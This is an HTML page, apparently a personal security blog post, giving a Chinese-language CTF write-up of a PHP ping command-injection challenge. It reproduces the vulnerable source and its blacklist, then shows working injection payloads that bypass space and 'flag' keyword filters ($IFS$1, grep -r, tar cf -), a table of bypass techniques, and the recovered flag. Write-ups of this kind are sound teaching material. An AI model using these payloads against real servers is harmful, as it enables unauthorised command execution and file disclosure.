@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境） · pressure-J</title>
+<meta name="description" content="浏览器访问直接回显 /?ip=，说明参数名是 ip。传入 ?ip=127.0.0.1 后返回 ping 结果：">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-ping-ming-ling-zhu-ru-guo-lv-rao-guo-writeup-dasctf-huan.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境） · pressure-J">
+<meta property="og:description" content="浏览器访问直接回显 /?ip=，说明参数名是 ip。传入 ?ip=127.0.0.1 后返回 ping 结果：">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境）</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-10-05">2026-10-05</time>
+          <span>4130 字</span>
+          <span>约 11 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>目标：<code>http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/</code><br />
+环境：PHP 5.6.40（openresty 前端），Ubuntu 容器，<code>www-data</code> 权限<br />
+考点：命令注入 + 多层黑名单绕过（空格、引号、<code>flag</code> 关键字）<br />
+结果：flag 位于 <code>flag.php</code> 内的 <code>$flag</code> 变量，<strong>需要读取文件内容（非直接输出）</strong></p>
+</blockquote>
+<hr />
+<h2 id="_1">一、信息收集</h2>
+<p>浏览器访问直接回显 <code>/?ip=</code>，说明参数名是 <code>ip</code>。传入 <code>?ip=127.0.0.1</code> 后返回 ping 结果：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.039 ms
+...
+</code></pre></div></div>
+
+<p><strong>判断依据</strong>：输出格式是 <code>PING xxx ... 56 data bytes</code>，这是 <strong>busybox ping</strong> 的特征（GNU ping 会显示 <code>64 bytes from ...: icmp_seq=1</code>）。说明后端执行的是 Linux 命令，且用户输入被直接拼进 <code>ping -c 4 &lt;input&gt;</code>。</p>
+<p><strong>测试注入点</strong>：<code>?ip=127.0.0.1;id</code> → 返回 <code>uid=82(www-data)</code>，<strong>命令注入成立</strong>。</p>
+<hr />
+<h2 id="_2">二、读取源码，确定过滤规则</h2>
+<p>注入成功后第一件事是<strong>读源码</strong>，而不是无脑试 payload。<code>;ls</code> 得到目录下有 <code>index.php</code>、<code>flag.php</code>。<br />
+用 <code>${IFS}$1</code> 代替空格（见下节），读 <code>index.php</code>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])){</span>
+  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|</span><span class="se">\"</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)){</span>
+    <span class="k">echo</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|</span><span class="se">\"</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"fxck your symbol!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/ /"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"fxck your space!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/bash/"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"fxck your bash!"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.*f.*l.*a.*g.*/"</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"fxck your flag!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="nv">$a</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"ping -c 4 "</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
+  <span class="nb">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>四层过滤，逐一分析：</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>正则</th>
+<th>含义</th>
+<th>绕过思路</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>&amp; \/ \? \* \&lt; &gt; ' " \\ ( ) [ ] { }</code> + 控制字符</td>
+<td>符号黑名单</td>
+<td><strong>没过滤 <code>;</code>、<code>\|</code>、<code>`</code>，也没过滤 <code>$</code></strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>/ /</code></td>
+<td>禁止空格</td>
+<td>用 <code>$IFS</code> 等环境变量代替</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>/bash/</code></td>
+<td>禁止 <code>bash</code> 字样</td>
+<td>本题用不到</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>/.*f.*l.*a.*g.*/</code></td>
+<td>禁止 <code>f…l…a…g</code> 按序出现</td>
+<td><strong>最狠的一条</strong>，文件名拼不出来</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>关键点：第 4 条正则没有 <code>s</code> 修饰符，<code>.</code> 不匹配换行符，理论上可以换行分割——但第 1 条把 <code>\x00-\x1f</code>（含换行、TAB）也禁了，这条路封死。</p>
+</blockquote>
+<hr />
+<h2 id="_3">三、绕过空格</h2>
+<p><strong>原理</strong>：Linux 里 <code>$IFS</code> 是 shell 的内部分隔符（Internal Field Separator），默认值是空格、TAB、换行。shell 在解析命令时会自动做变量替换，所以 <code>cat$IFSflag</code> 展开后等价于 <code>cat flag</code>。此外 <code>$1</code>~<code>$9</code> 在无参数时是<strong>空字符串</strong>，既能当变量名分隔符又能被消除，故 <code>$IFS$1</code> 是最稳的写法（避免和后面紧邻的字母连成一个不存在的变量名）。</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>写法</th>
+<th>效果</th>
+<th>评价</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$IFS</code></td>
+<td>✅ 可用</td>
+<td>后面必须跟非变量名字符，否则会粘连</td>
+</tr>
+<tr>
+<td><code>$IFS$1</code></td>
+<td>✅ <strong>最稳</strong></td>
+<td><code>$1</code> 展开为空，兼作分隔符</td>
+</tr>
+<tr>
+<td><code>${IFS}</code></td>
+<td>❌ 被拦（<code>{}</code> 在黑名单里）</td>
+<td>用不了</td>
+</tr>
+<tr>
+<td><code>&lt;file</code></td>
+<td>❌ 被拦（<code>&lt;</code>）</td>
+<td>重定向输入不可用</td>
+</tr>
+<tr>
+<td>字面 TAB <code>%09</code></td>
+<td>❌ 被拦（<code>\x00-\x1f</code>）</td>
+<td>用不了</td>
+</tr>
+</tbody>
+</table></div>
+<p>验证：<code>?ip=;ls$IFS-la</code> 成功列出目录。</p>
+<hr />
+<h2 id="flag">四、绕过 <code>flag</code> 关键字 —— 本题核心</h2>
+<p><code>cat flag.php</code> 直接触发 <code>fxck your flag!</code>；<code>fla\g.php</code>、<code>fla"g".php</code>、<code>fla*g.php</code> 也全被拦（<code>\</code> <code>"</code> <code>*</code> 在黑名单）。</p>
+<p><strong>思路转向</strong>：既然文件名拼不出来，就<strong>不拼文件名</strong>。有两个优雅方案：</p>
+<h3 id="agrep-r">方案 A：<code>grep -r</code> 遍历当前目录（推荐，最省事）</h3>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-r<span class="w"> </span>.<span class="w"> </span>.
+</code></pre></div></div>
+
+<p><code>-r</code> 递归，参数 <code>.</code> 是"当前目录"，第二个 <code>.</code> 是匹配模式（任意字符）。目录里只有两个文件，任何含任意字符的行都会被打印出来，而 <strong><code>grep</code> 对二进制/异常行会直接输出 <code>文件名:内容</code></strong>，从而把 <code>flag.php</code> 的内容连带文件名一起吐出来。</p>
+<p>Payload（空格全用 <code>$IFS$1</code> 代替）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>?ip=;grep$IFS$1-r$IFS$1.$IFS$1.
+</code></pre></div></div>
+
+<p>回显：</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>./index.php:/?ip=
+./index.php:&lt;?php
+...
+./flag.php:&lt;?php
+./flag.php:$flag = "CTF2{b95807d0-1838-4493-ae87-94ba3ecb28e6}";
+./flag.php:?&gt;
+</code></pre></div></div>
+
+<blockquote>
+<p>为什么有效：payload 里没有 <code>f…l…a…g</code> 按序序列（<code>grep</code>/<code>-r</code>/<code>.</code> 都不含），完美绕过第 4 条正则。</p>
+</blockquote>
+<h3 id="btar">方案 B：<code>tar</code> 打包再读（通杀思路，值得记住）</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>tar<span class="w"> </span>cf<span class="w"> </span>-<span class="w"> </span>.<span class="w">        </span><span class="c1"># 把当前目录打包成流输出到标准输出，内容含未压缩文件名+文件内容</span>
+tar<span class="w"> </span>cf<span class="w"> </span>/tmp/a<span class="w"> </span>.<span class="w">   </span><span class="c1"># 或落地成文件再 tar xf 解包</span>
+</code></pre></div></div>
+
+<p>Payload：<code>?ip=;tar$IFS$1cf$IFS$1-$IFS$1.</code></p>
+<p><strong>为什么 <code>tar</code> 能读文件</strong>：<code>tar</code> 是归档不是压缩，<code>cf - .</code> 把目录里所有文件的<strong>原始字节</strong>连同文件名一起写到 stdout，因此回显里能直接看到文件内容。这是绕过"关键字黑名单"的通用招数——<strong>不引用被禁的名字，仍能拿到内容</strong>。</p>
+<h3 id="c">方案 C：其他同类变形（备用）</h3>
+<ul>
+<li><code>sort *</code> / <code>tac *</code> / <code>head *</code>：<code>*</code> 被拦，需换 <code>$(ls)</code>——但 <code>()</code> 也被拦，<strong>本题不可用</strong></li>
+<li><code>od -c</code> / <code>xxd</code>：<code>-</code> 可用，但需要对文件名通配，同 C 的问题</li>
+<li><code>nl &lt;file&gt;</code>：<code>&lt;</code> 被拦</li>
+</ul>
+<blockquote>
+<p>结论：本题最优解就是 <strong>A（<code>grep -r</code>）或 B（<code>tar cf - .</code>）</strong>。</p>
+</blockquote>
+<hr />
+<h2 id="payload-flag">五、最终 Payload 与 flag</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code># 方法一：grep 递归遍历
+http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/?ip=;grep$IFS$1-r$IFS$1.$IFS$1.
+
+# 方法二：tar 打包输出
+http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/?ip=;tar$IFS$1cf$IFS$1-$IFS$1.
+</code></pre></div></div>
+
+<p><strong>flag = <code>CTF2{b95807d0-1838-4493-ae87-94ba3ecb28e6}</code></strong></p>
+<hr />
+<h2 id="_4">六、知识点沉淀</h2>
+<h3 id="1-ifs">1. <code>$IFS</code> 为什么能代替空格</h3>
+<p>shell 解析命令行时，先做<strong>变量替换</strong>，再做<strong>词分割</strong>。<code>$IFS</code> 展开成一个空格字符，此时它和手敲的空格在语义上<strong>完全等价</strong>——因为词分割发生在替换之后。这也是 PHP 侧 <code>preg_match('/ /')</code> 拦不住它的原因：PHP 只检查了原始字符串里有没有空格字符，而 shell 是在替换后才分割的。</p>
+<h3 id="2-19">2. <code>$1</code>~<code>$9</code> 当分隔符</h3>
+<p><code>$1</code> 无参数时为空串。写成 <code>cat$IFS$1flag</code>：<code>$IFS</code> → 空格，<code>$1</code> → 空，最终 <code>cat flag</code>。它的作用是<strong>截断变量名</strong>，否则 <code>$IFSflag</code> 会被解析成名为 <code>IFSflag</code> 的变量（不存在 → 空）。</p>
+<h3 id="3">3. 关键字黑名单的通用绕过思路</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>手法</th>
+<th>说明</th>
+<th>本例可用性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>通配符 <code>?</code> <code>*</code></td>
+<td><code>cat fla?.php</code></td>
+<td>❌ 都被拦</td>
+</tr>
+<tr>
+<td>引号拼接</td>
+<td><code>cat fla""g.php</code></td>
+<td>❌ 引号被拦</td>
+</tr>
+<tr>
+<td>反斜杠转义</td>
+<td><code>cat fla\g.php</code></td>
+<td>❌ 被拦</td>
+</tr>
+<tr>
+<td>命令替换</td>
+<td><code>cat `ls`</code> / <code>$(ls)</code></td>
+<td>❌ 反引号、<code>()</code> 被拦</td>
+</tr>
+<tr>
+<td><strong>不引用文件名</strong></td>
+<td><code>grep -r . .</code> / <code>tar cf - .</code></td>
+<td>✅ <strong>可用</strong></td>
+</tr>
+<tr>
+<td>变量拼接</td>
+<td><code>a=fl;b=ag;$a$b</code></td>
+<td>❌ <code>=</code> 需配合，且无空格难拼多命令</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>核心教训：<strong>当"引用某个名字"被全面封锁时，改从"不引用名字也能拿到内容"的层面思考</strong>（归档、递归搜索、目录遍历）。</p>
+</blockquote>
+<h3 id="4">4. 顺带踩的坑</h3>
+<ul>
+<li><code>&amp;</code> 被拦 → 无法用 <code>&amp;&amp;</code>、<code>&amp;</code> 后台执行；<code>;</code> 和 <code>|</code> 是唯二可用的命令分隔符。</li>
+<li><strong>空回显 ≠ 被拦</strong>。实测 <code>grep$IFSr$IFS.</code> 回显全空，原因是 <code>grep -r .</code> 缺少最后一个 FILE 参数（漏了 <code>.</code>），grep 转去读标准输入，而 shell_exec 下 stdin 无数据，于是静默退出；且 stderr 不会被 <code>shell_exec</code> 捕获。正确写法必须是 <code>grep -r . .</code>（两个点：前者是目录，后者是模式）。</li>
+<li><strong>不要想当然加限制条件</strong>。我先入为主以为存在 payload 长度上限，实测 <code>;echo</code> + 20~44 个字符全部正常回显，长度不受限——排查时应以实测为准，不要凭经验写结论。</li>
+</ul></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-an-quan-yi-ju-hua-mu-ma-eval-webshell-writeup-bai-gei-de-shell.html"><span>← 上一篇</span><strong>Web安全 · 一句话木马（eval webshell）WriteUp —「白给的shell」</strong></a><a class="pn-item next" href="web-an-quan-wen-jian-shang-chuan-rao-guo-hei-ming-dan-fan-zhuan-scri.html"><span>下一篇 →</span><strong>Web安全 · 文件上传绕过（黑名单反转 + `&lt;script&gt;` 标签）WriteUp —「上传头像」</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、信息收集</a><a href="#_2" class="toc-lv2">二、读取源码，确定过滤规则</a><a href="#_3" class="toc-lv2">三、绕过空格</a><a href="#flag" class="toc-lv2">四、绕过 flag 关键字 —— 本题核心</a><a href="#agrep-r" class="toc-lv3">方案 A：grep -r 遍历当前目录（推荐，最省事）</a><a href="#btar" class="toc-lv3">方案 B：tar 打包再读（通杀思路，值得记住）</a><a href="#c" class="toc-lv3">方案 C：其他同类变形（备用）</a><a href="#payload-flag" class="toc-lv2">五、最终 Payload 与 flag</a><a href="#_4" class="toc-lv2">六、知识点沉淀</a><a href="#1-ifs" class="toc-lv3">1. $IFS 为什么能代替空格</a><a href="#2-19" class="toc-lv3">2. $1~$9 当分隔符</a><a href="#3" class="toc-lv3">3. 关键字黑名单的通用绕过思路</a><a href="#4" class="toc-lv3">4. 顺带踩的坑</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
